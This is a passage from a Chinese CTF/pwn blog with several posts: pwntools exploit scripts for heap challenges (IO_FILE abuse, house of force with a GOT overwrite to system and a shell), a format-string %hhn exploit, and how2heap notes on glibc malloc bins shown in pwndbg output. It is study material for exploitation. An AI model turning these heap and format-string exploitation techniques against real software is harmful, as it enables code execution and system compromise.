class="line">strjumps=lbase+0x3c37a0</span><br><span class="line"></span><br><span class="line">fire=p64(0)+p64(0x61)+p64(0)+p64(iolistall-0x10)+p64(0)+p64(1)+p64(0)+p64(sh)+p64(0)*19+p64(strjumps-8)</span><br><span class="line">fire=fire.ljust(0xe8,&#x27;\x00&#x27;)+p64(sys)</span><br><span class="line">add(&#x27;e&#x27;,0,&#x27;\x00&#x27;*0x10+fire)#4</span><br><span class="line">r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">r.sendline(&#x27;1&#x27;)</span><br><span class="line">r.recvuntil(&#x27;What is the author name?&#x27;)</span><br><span class="line">r.sendline(&#x27;test&#x27;)</span><br><span class="line">r.recvuntil(&#x27;How long is the book name?&#x27;)</span><br><span class="line">r.sendline(str(0x40))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>师傅直接根据溢出用 IO_FILE 做的,整的我头皮发麻.又懂了一个知识点,开心,但是这个我不太知道偏移有什么好的办法去算</p>
<h2 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h2><blockquote>
<p>off by one(很大范围)</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">env=os.environ</span><br><span class="line">#env[&#x27;LD_PRELOAD&#x27;]=&#x27;./myhouse.so&#x27;</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">libc=ELF(&#x27;./myhouse.so&#x27;)</span><br><span class="line">r=process(&#x27;./myhouse&#x27;)</span><br><span class="line">def addroom(size):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:\n&#x27;)</span><br><span class="line">    r.sendline(&#x27;1&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;What is the size of your room?&#x27;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">def editroom(cont):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;2&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;shining!&#x27;)</span><br><span class="line">    r.send(cont)</span><br><span class="line">def show():</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;3&#x27;)</span><br><span class="line">#step 1:write &#x27;\x00&#x27; to main_arena&#x27;s top_chunk pointer and set top&#x27;s size</span><br><span class="line">r.recvuntil(&#x27;name?&#x27;)</span><br><span class="line">r.send(&#x27;a&#x27;*0x20)</span><br><span class="line">r.recvuntil(&#x27;name of your house?&#x27;)</span><br><span class="line">r.send(&#x27;b&#x27;*0xf8+p64(0xffffffffffffffff))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.recvuntil(&#x27;size of your house?&#x27;)</span><br><span class="line">r.sendline(str(0x5c5b69))</span><br><span class="line">r.recvuntil(&#x27;Too large!&#x27;)</span><br><span class="line">r.sendline(str(0x200000))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.recvuntil(&#x27;Give me its description:&#x27;)</span><br><span class="line">r.send(&#x27;c&#x27;*0x30)</span><br><span class="line">#step 2:leak heap address</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(&#x27;a&#x27;*0x20)</span><br><span class="line">heap=u64(r.recvline()[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &quot;heap:&quot;+hex(heap)</span><br><span class="line"></span><br><span class="line">#step 3:house of force</span><br><span class="line">bssp=0x6020c0</span><br><span class="line">addroom(bssp-(heap+0xf0)-0x20)</span><br><span class="line">addroom(0x60)</span><br><span class="line">#step 4:leak GOT and change GOT</span><br><span class="line">got_atoi=0x602058</span><br><span class="line">editroom(p64(got_atoi)+p64(got_atoi))</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(&#x27;And description:\n&#x27;)</span><br><span class="line">atoi=u64(r.recvline()[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &quot;atoi:&quot;+hex(atoi)</span><br><span class="line">sys=atoi-libc.symbols[&#x27;atoi&#x27;]+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">editroom(p64(sys))</span><br><span class="line">r.sendline(&#x27;sh&#x27;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>给<a target="_blank" rel="noopener" href="https://xz.aliyun.com/u/20175">师傅</a>跪了,思路太无敌了,很清楚,得消化两天</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/05/2019-10-05-goods/" data-id="cuidYZvrP_dlfBHLvrJSzmQbi" data-title="Some interesting exercises" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-10-04-printf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/04/2019-10-04-printf/" class="article-date">
  <time class="dt-published" datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished">2019-10-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/04/2019-10-04-printf/">format string</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这里深入回顾一下格式化字符串漏洞（32位）</p>
<h2 id="任意位置读写"><a href="#任意位置读写" class="headerlink" title="任意位置读写"></a>任意位置读写</h2><p>如果输入内容在栈偏移的第五个字节，可以这样泄露 <code>\x01\x80\x04\x08%5$s</code> 08048001 的内容</p>
<p>同理，<code>\x8c\x97\x04\x08%5$n</code> 可以完成覆盖 08049748c 内容为 4 （前边字符数），而 <code>\x8c\x97\x04\x08%2048c%5$n</code> 可以完成覆盖 08049748c 内容为 2048+4</p>
<h2 id="“一分为四”"><a href="#“一分为四”" class="headerlink" title="“一分为四”"></a>“一分为四”</h2><blockquote>
<p>以“第五空间”的 五蘊 为例</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  int fd; // ST14_4</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  unsigned int v5; // et1</span><br><span class="line">  char nptr; // [esp+4h] [ebp-80h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-70h]</span><br><span class="line">  unsigned int v8; // [esp+78h] [ebp-Ch]</span><br><span class="line">  int *v9; // [esp+7Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = &amp;a1;</span><br><span class="line">  v8 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;unk_804C044, 4u);</span><br><span class="line">  printf(&quot;your name:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x63u);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(&amp;buf);     ------------------漏洞点</span><br><span class="line">  printf(&quot;your passwd:&quot;);</span><br><span class="line">  read(0, &amp;nptr, 0xFu);</span><br><span class="line">  if ( atoi(&amp;nptr) == unk_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ok!!&quot;);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;fail&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0;</span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  v4 = v5 ^ v8;</span><br><span class="line">  if ( v5 != v8 )</span><br><span class="line">    sub_80493D0(v4);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main 函数很简单，就是看你输入的和 urandom 一样不，这不废话，我们只能覆盖掉 unk_804C044 内容</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先确定偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your name:%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x </span><br><span class="line">Hello,fff23058.63.0.fff2307e.3.c2.f7e696bb.fff2307e.fff2317c.252e7825.78252e78.2e78252e</span><br></pre></td></tr></table></figure>

<p>了解了，从第十个字节，之后上 exp ，来自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6431">大佬</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./5&#x27;)</span><br><span class="line"></span><br><span class="line">target=0x804c044</span><br><span class="line">pay=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)+&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">r.sendline(str(0x10101010))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>我们看一下 pay ，第 10 个参数是 0x804c044 这个字节，把它改成 10 ，第 11 个是 0x804c044+1 ，也改成了 10 ，后两个同理，之后直接发送 <code>r.sendline(str(0x10101010))</code> ，就可以了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/04/2019-10-04-printf/" data-id="cuidpbXbKiQXGanIfRt5kYxaM" data-title="format string" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-09-27-how2heap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/09/29/2019-09-27-how2heap/" class="article-date">
  <time class="dt-published" datetime="2019-09-28T16:00:00.000Z" itemprop="datePublished">2019-09-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/09/29/2019-09-27-how2heap/">how2heap</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>好多大佬们都对<strong>how2heap</strong>这个项目进行了汇总,我就不班门弄斧了,但是同时大佬对一些问题一笔带过,这里就记一下本人在学 how2heap 中的一些有疑问的点,应该具有一定的代表性.大佬可以帮忙挑错,希望和大家一起进步</p>
<h2 id="first-fit-疑问和拓展"><a href="#first-fit-疑问和拓展" class="headerlink" title="first_fit 疑问和拓展"></a>first_fit 疑问和拓展</h2><p>我一开始就有疑问,为什么明明是 smallbins 和 largebins 范围内的 chunk ,它直接去 unsortedbins 呢,事实上只要不是 fastbins 范围内的,经过 free 后都会先进入 unsorted bin 待命.系统在进行 malloc 分配的时候 unsortedbin 算是起到一个缓冲区的作用,测试程序如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char* a = malloc(512);</span><br><span class="line">    char* b = malloc(256);</span><br><span class="line">    free(a);</span><br><span class="line">    char* c = malloc(500);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>断在 malloc(c)处(<strong>注</strong>:以后 <code>char* c = malloc(500)</code> 这种直接简写成 malloc(c) )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    4 int main()</span><br><span class="line">    5 &#123;</span><br><span class="line">    6     char* a = malloc(512);</span><br><span class="line">    7     char* b = malloc(256);</span><br><span class="line">    8     free(a);</span><br><span class="line"> ►  9     char* c = malloc(500);</span><br><span class="line">   10 //  char* d = malloc(512); </span><br><span class="line">   11 &#125;</span><br><span class="line">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────</span><br><span class="line">...</span><br><span class="line">────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Breakpoint /home/pic/桌面/te.c:9</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>之后 malloc(c) 会把 unsortedbin 这个取出(只有这个bin不加s,不是复数,也可以说明只有一个链表,2333),而倘若把程序进行如下的修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    5 &#123;</span><br><span class="line">    6     char* a = malloc(512);</span><br><span class="line">    7     char* b = malloc(256);</span><br><span class="line">    8     free(a);</span><br><span class="line">    9     char* c = malloc(10);</span><br><span class="line"> ► 10     char* d = malloc(512); </span><br><span class="line">   11 &#125;</span><br><span class="line">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────</span><br><span class="line">...</span><br><span class="line">────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602010:	0x00007ffff7dd1d78	0x00007ffff7dd1d78</span><br><span class="line">0x602020:	0x0000000000000000	0x00000000000001f1</span><br><span class="line">0x602030:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到程序仍然是从 unsortedbin 取出的,不过进行了切割, c 只拿走了0x20(1是标志位)个字节,剩下了0x1f0字节(剩下的我们称之为 <strong>remainder chunk</strong> ,仍留在 unsortedbin 中),而 remainder chunk 完全不够 d 的大小,所以猜想 d 会切割 top chunk ,之后我们再 n 单步运行发现果然是这样,但是同时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;			&lt;------------------c</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x7ffff7dd1d78 &lt;main_arena+600&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1d78 &lt;main_arena+600&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x1f1</span><br><span class="line">&#125;</span><br><span class="line">0x602020 PREV_INUSE &#123;			&lt;------------------之前的 remainder chunk</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 497, </span><br><span class="line">  fd = 0x7ffff7dd1d58 &lt;main_arena+568&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1d58 &lt;main_arena+568&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602210 &#123;				&lt;------------------b</span><br><span class="line">  prev_size = 496, </span><br><span class="line">  size = 272, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602320 PREV_INUSE &#123;			&lt;-------------------d</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 529, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602530 PREV_INUSE &#123;			&lt;-------------------top chunk</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 133841, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p d</span><br><span class="line">$1 = 0x602330 &quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x1f0: 0x602020 —▸ 0x7ffff7dd1d58 (main_arena+568) ◂— 0x602020 /* &#x27;  `&#x27; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>发现我们之前剩下的 chunk 这才被归入了 smallbins .我们可以形象的理解为 unsortedbin 非常强势,试图掌握一切,但是它在能力不足时才会把别人应得的归还,也即我们常说的甩锅,2333</p>
<h2 id="consolidate研究"><a href="#consolidate研究" class="headerlink" title="consolidate研究"></a>consolidate研究</h2><p>我在这里直接演示一个比较极端的例子,因为 how2heap 中的程序 fastbin_dup_consolidate 看上去就像是直接整合到了 smallbins 一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x70);</span><br><span class="line">  void* p3 = malloc(0x70);</span><br><span class="line">  void* p4 = malloc(0x70);</span><br><span class="line">  void* p5 = malloc(0x70);</span><br><span class="line">  void* p6 = malloc(0x70);</span><br><span class="line">  void* p7 = malloc(0x70);</span><br><span class="line">  void* p8 = malloc(0x70);</span><br><span class="line">  void* p9 = malloc(0x70);</span><br><span class="line">  void* p10 = malloc(0x70);</span><br><span class="line">  void* p2 = malloc(0x70);</span><br><span class="line">  free(p1);</span><br><span class="line">  free(p3);</span><br><span class="line">  free(p4);</span><br><span class="line">  free(p5);</span><br><span class="line">  free(p6);</span><br><span class="line">  free(p7);</span><br><span class="line">  free(p8);</span><br><span class="line">  free(p9);</span><br><span class="line">  free(p10);</span><br><span class="line">  void* p12 = malloc(0x400);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接在 malloc(p12) 中下断,跑起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x602400 —▸ 0x602380 —▸ 0x602300 —▸ 0x602280 —▸ 0x602200 ◂— ...</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>之前 free 的都跑到了 fastbins 再次 n 单步,发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602410 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602410</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>经过 consolidate 后,我们的 fastbins 全部被摘下来了,同时进入了 unsortedbin ,而且也够 p12 要求的大小.所以整合过的 chunk 就直接分配给 p12 了.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p p12</span><br><span class="line">$2 = (void *) 0x602010</span><br></pre></td></tr></table></figure>

<p>这时候我们再回头看看 fastbin_dup_consolidate ,把之前我们介绍的强势的 unsortedbin 概念拿过来,我们发现,事实上该程序在 <code>void* p3 = malloc(0x400);</code> 时, unsortedbin 的大小并不满足 p3 所要求的大小,所以会进行”甩锅”,把 unsortedbin 中的 chunk 丢到 smallbins 中</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><p>大佬们已经总结的很好了,解决这两个问题就完事</p>
<ul>
<li>unlink 过程</li>
<li>最后的赋值修改</li>
</ul>
<blockquote>
<p>unlink过程</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure>

<p>我们看一下, FD 和 BK 都是相对 P(fake chunk) 而言的,所以 FD 就是 0x602058 ,同时 BK 是 0x602060 ,所以 FD-&gt;bk &#x3D; 0x602060 , BK-&gt;fd &#x3D; 0x602058 ,由于<code>FD-&gt;bk</code>和<code>BK-&gt;fd</code>这两块都是指向一处地址,后边的有效,改成了</p>
